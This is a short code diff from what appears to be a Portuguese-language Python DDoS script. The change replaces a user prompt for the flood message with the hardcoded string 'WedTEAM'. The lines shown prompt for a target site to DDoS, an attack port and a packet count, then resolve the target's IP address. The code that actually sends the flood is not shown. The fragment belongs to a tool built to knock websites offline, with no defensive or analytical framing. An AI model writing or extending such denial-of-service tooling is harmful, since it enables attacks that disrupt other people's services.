@@ -26,12 +26,11 @@ def restart_program():
     python = sys.executable
     os.execl(python, python, * sys.argv)
 curdir = os.getcwd()
+message = "WedTEAM"
 print (" ")
 host=raw_input( "DIGITE O SITE PARA DDoS :" )
 print (" ")
 port=input( "DIGITE A PORTA PARA O ATAQUE :" )
-print (" ")
-message=raw_input( "MENSAGEM A SER ENVIADA :" )
 print (" ")
 conn=input( "QUANTOS PACKETS DESEJA ENVIAR ? :" )
 ip = socket.gethostbyname( host )
